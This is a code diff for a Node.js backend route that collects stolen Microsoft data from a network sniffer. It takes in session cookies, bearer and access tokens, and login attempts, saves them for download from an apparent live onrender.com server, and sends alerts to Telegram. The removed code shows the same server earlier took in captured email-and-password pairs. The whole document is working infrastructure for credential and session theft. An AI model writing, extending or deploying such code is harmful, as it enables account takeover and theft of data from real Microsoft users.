@@ -57,24 +57,53 @@ async function sendTelegramAlert(victimData, fileInfo) {
   try {
     let message = '';
     
-    if (victimData.type === 'credentials_captured') {
-      message = `🔐 <b>MICROSOFT CREDENTIALS CAPTURED</b>
+    // Handle different data types from Python script
+    if (victimData.type === 'microsoft_cookie' || victimData.type === 'microsoft_set_cookie') {
+      message = `🍪 <b>MICROSOFT COOKIE CAPTURED</b>
 
-📧 <b>Email:</b> <code>${victimData.credentials?.email || victimData.email}</code>
-🔑 <b>Password:</b> <code>${victimData.credentials?.password || victimData.password}</code>
-🌐 <b>Domain:</b> ${victimData.page_info?.url || 'unknown'}
+🌐 <b>Domain:</b> ${victimData.data?.domain || 'unknown'}
+🔐 <b>Cookie Type:</b> ${victimData.type}
+📊 <b>Cookies Found:</b> ${Object.keys(victimData.data?.cookie_data?.cookies_parsed || {}).length}
 
-📍 <b>Client Info:</b>
-├ User Agent: ${victimData.page_info?.user_agent?.substring(0, 50)}...
-└ Time: ${victimData.timestamp}
+📍 <b>Target IP:</b> ${victimData.target_ip}
+⏰ <b>Time:</b> ${victimData.timestamp}
 
-⚠️ <b>Account can be accessed immediately</b>`;
+💾 <b>Storage:</b>
+├ File: <code>${fileInfo.filename}</code>
+└ Download: /chukachina/download/${fileInfo.filename}`;
+
+    } else if (victimData.type === 'bearer_token' || victimData.type === 'access_token') {
+      message = `🔑 <b>MICROSOFT TOKEN CAPTURED</b>
+
+🌐 <b>Domain:</b> ${victimData.data?.domain || 'unknown'}
+🔐 <b>Token Type:</b> ${victimData.type}
+📏 <b>Token Length:</b> ${victimData.data?.token_data?.token_length || 'unknown'}
+
+📍 <b>Target IP:</b> ${victimData.target_ip}
+⏰ <b>Time:</b> ${victimData.timestamp}`;
+
+    } else if (victimData.type === 'microsoft_site_visit') {
+      message = `🌐 <b>MICROSOFT SITE VISITED</b>
+
+📡 <b>Domain:</b> ${victimData.data?.domain || 'unknown'}
+👤 <b>Target IP:</b> ${victimData.target_ip}
+⏰ <b>Time:</b> ${victimData.timestamp}`;
+
+    } else if (victimData.type === 'login_attempt') {
+      message = `🔐 <b>MICROSOFT LOGIN ATTEMPT</b>
+
+🌐 <b>Domain:</b> ${victimData.data?.domain || 'unknown'}
+📝 <b>Data Preview:</b> ${victimData.data?.payload_preview || 'No data'}
+👤 <b>Target IP:</b> ${victimData.target_ip}
+⏰ <b>Time:</b> ${victimData.timestamp}`;
+
     } else {
-      message = `🎯 <b>NEW DATA RECEIVED</b>
+      // Generic message for other types
+      message = `📦 <b>NEW DATA RECEIVED</b>
 
 📊 <b>Type:</b> ${victimData.type}
-🌐 <b>Service:</b> ${victimData.service}
-📧 <b>User:</b> ${victimData.user_profile || 'Not found'}
+🌐 <b>Service:</b> ${victimData.data?.domain || 'microsoft'}
+👤 <b>Target IP:</b> ${victimData.target_ip}
 
 💾 <b>Storage:</b>
 ├ File: <code>${fileInfo.filename}</code>
@@ -91,6 +120,11 @@ async function sendTelegramAlert(victimData, fileInfo) {
       })
     });
 
+    if (!response.ok) {
+      console.error('Telegram API error:', response.status, response.statusText);
+      return null;
+    }
+
     return await response.json();
   } catch (error) {
     console.error('Telegram error:', error);
@@ -101,68 +135,135 @@ async function sendTelegramAlert(victimData, fileInfo) {
 // ==================== MAIN ENDPOINT ====================
 router.post('/', async (req, res) => {
   try {
-    console.log('🎯 New data received!');
-    console.log('📥 Received data:', JSON.stringify(req.body, null, 2));
+    console.log('🎯 New data received from Python sniffer!');
+    console.log('📥 Received data type:', req.body?.type);
     
     const victimData = req.body;
     
-    // Handle different data types
-    if (victimData.type === 'credentials_captured') {
-      console.log('🔐 CREDENTIALS CAPTURED:', victimData.credentials?.email || victimData.email);
-      
-      // Save credentials data
-      const fileInfo = await saveSessionData({
-        ...victimData,
-        service: 'microsoft_credentials',
-        page_url: victimData.page_info?.url || victimData.url || 'unknown'
+    // Validate required fields
+    if (!victimData.type) {
+      return res.status(400).json({
+        success: false,
+        message: "Missing required field: type"
       });
+    }
+
+    // Handle connection test first
+    if (victimData.type === 'connection_test') {
+      console.log('🔗 Connection test received');
       
-      // Send Telegram alert
-      await sendTelegramAlert(victimData, fileInfo);
-      
-      res.status(200).json({
+      return res.status(200).json({
         success: true,
-        message: "Credentials received successfully",
-        data_received: {
-          type: victimData.type,
-          email: victimData.credentials?.email || victimData.email,
-          credentials_captured: true
-        },
-        timestamp: new Date().toISOString()
-      });
-      
-    } else if (victimData.type === 'page_loaded' || victimData.type === 'connection_test') {
-      console.log('📄 Analytics data:', victimData.type);
-      
-      // Just acknowledge, no need to save
-      res.status(200).json({
-        success: true,
-        message: "Data received",
+        message: "Backend connection successful",
         type: victimData.type,
         timestamp: new Date().toISOString()
       });
+    }
+
+    // Handle heartbeat
+    if (victimData.type === 'heartbeat') {
+      console.log('💓 Heartbeat received - Packets:', victimData.data?.packets_processed);
       
-    } else {
-      // Generic data handling
-      console.log('📦 Generic data received:', victimData.type);
-      
-      const fileInfo = await saveSessionData(victimData);
-      await sendTelegramAlert(victimData, fileInfo);
-      
-      res.status(200).json({
+      return res.status(200).json({
         success: true,
-        message: "Data received and saved",
-        data_type: victimData.type,
+        message: "Heartbeat received",
+        type: victimData.type,
+        packets_processed: victimData.data?.packets_processed,
+        timestamp: new Date().toISOString()
+      });
+    }
+
+    // Handle final report
+    if (victimData.type === 'final_report') {
+      console.log('📊 Final report received');
+      
+      const fileInfo = await saveSessionData({
+        ...victimData,
+        service: 'attack_summary',
+        report_type: 'final'
+      });
+      
+      return res.status(200).json({
+        success: true,
+        message: "Final report saved",
+        type: victimData.type,
         storage_info: {
           filename: fileInfo.filename,
-          download_url: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`
+          download_url: fileInfo.download_url
         },
         timestamp: new Date().toISOString()
       });
     }
+
+    // Handle Microsoft-specific data
+    const microsoftTypes = [
+      'microsoft_cookie',
+      'microsoft_set_cookie', 
+      'bearer_token',
+      'access_token',
+      'microsoft_site_visit',
+      'login_attempt'
+    ];
+
+    if (microsoftTypes.includes(victimData.type)) {
+      console.log(`🎯 Microsoft ${victimData.type} captured`);
+      
+      // Determine service name based on type
+      let service = 'microsoft';
+      if (victimData.type.includes('cookie')) {
+        service = 'microsoft_cookies';
+      } else if (victimData.type.includes('token')) {
+        service = 'microsoft_tokens';
+      } else if (victimData.type.includes('site')) {
+        service = 'microsoft_sites';
+      } else if (victimData.type.includes('login')) {
+        service = 'microsoft_login';
+      }
+
+      // Save session data
+      const fileInfo = await saveSessionData({
+        ...victimData,
+        service: service,
+        captured_at: new Date().toISOString()
+      });
+
+      // Send Telegram alert
+      await sendTelegramAlert(victimData, fileInfo);
+
+      return res.status(200).json({
+        success: true,
+        message: `${victimData.type} received and saved`,
+        data_type: victimData.type,
+        storage_info: {
+          filename: fileInfo.filename,
+          download_url: `https://chuksinno-backend-1.onrender.com${fileInfo.download_url}`
+        },
+        timestamp: new Date().toISOString()
+      });
+    }
+
+    // Handle unknown types
+    console.log('❓ Unknown data type:', victimData.type);
+    
+    const fileInfo = await saveSessionData({
+      ...victimData,
+      service: 'unknown_type',
+      captured_at: new Date().toISOString()
+    });
+
+    return res.status(200).json({
+      success: true,
+      message: "Unknown data type saved",
+      data_type: victimData.type,
+      storage_info: {
+        filename: fileInfo.filename,
+        download_url: `https://chuksinno-backend-1.onrender.com${fileInfo.download_url}`
+      },
+      timestamp: new Date().toISOString()
+    });
     
   } catch (error) {
-    console.error("Error processing data:", error);
+    console.error("❌ Error processing data:", error);
     res.status(500).json({
       success: false,
       message: "Internal server error",
@@ -225,26 +326,34 @@ router.get('/sessions', async (req, res) => {
     
     const sessions = await Promise.all(
       sessionFiles.map(async (file) => {
-        const filepath = path.join(DATA_DIR, file);
-        const content = await fs.readFile(filepath, 'utf8');
-        const data = JSON.parse(content);
-        
-        return {
-          filename: file,
-          service: data.service,
-          type: data.type,
-          timestamp: data.timestamp,
-          cookies_count: data.cookies?.length || 0,
-          tokens_count: data.local_storage_tokens?.length || 0,
-          download_url: `/chukachina/download/${file}`
-        };
+        try {
+          const filepath = path.join(DATA_DIR, file);
+          const content = await fs.readFile(filepath, 'utf8');
+          const data = JSON.parse(content);
+          
+          return {
+            filename: file,
+            service: data.service,
+            type: data.type,
+            timestamp: data.timestamp,
+            target_ip: data.target_ip,
+            domain: data.data?.domain || 'unknown',
+            download_url: `/chukachina/download/${file}`
+          };
+        } catch (error) {
+          console.error(`Error reading file ${file}:`, error);
+          return null;
+        }
       })
     );
     
+    // Filter out null entries
+    const validSessions = sessions.filter(session => session !== null);
+    
     res.json({
       success: true,
-      total_sessions: sessions.length,
-      sessions: sessions
+      total_sessions: validSessions.length,
+      sessions: validSessions
     });
     
   } catch (error) {
@@ -264,9 +373,28 @@ router.get('/health', async (req, res) => {
     const files = await fs.readdir(DATA_DIR);
     const sessionCount = files.filter(file => file.endsWith('.json')).length;
     
+    // Get recent sessions
+    const recentSessions = await Promise.all(
+      files.slice(-5).map(async (file) => {
+        try {
+          const filepath = path.join(DATA_DIR, file);
+          const content = await fs.readFile(filepath, 'utf8');
+          const data = JSON.parse(content);
+          return {
+            filename: file,
+            type: data.type,
+            service: data.service,
+            timestamp: data.timestamp
+          };
+        } catch (error) {
+          return null;
+        }
+      })
+    );
+    
     res.json({
       success: true,
-      message: "Credential capture endpoint is running",
+      message: "Microsoft Cookie Sniffer Backend is running",
       endpoints: {
         main: "POST /chukachina",
         download: "GET /chukachina/download/:filename",
@@ -277,6 +405,7 @@ router.get('/health', async (req, res) => {
         total_sessions: sessionCount,
         data_directory: DATA_DIR
       },
+      recent_activity: recentSessions.filter(s => s !== null),
       timestamp: new Date().toISOString()
     });
   } catch (error) {
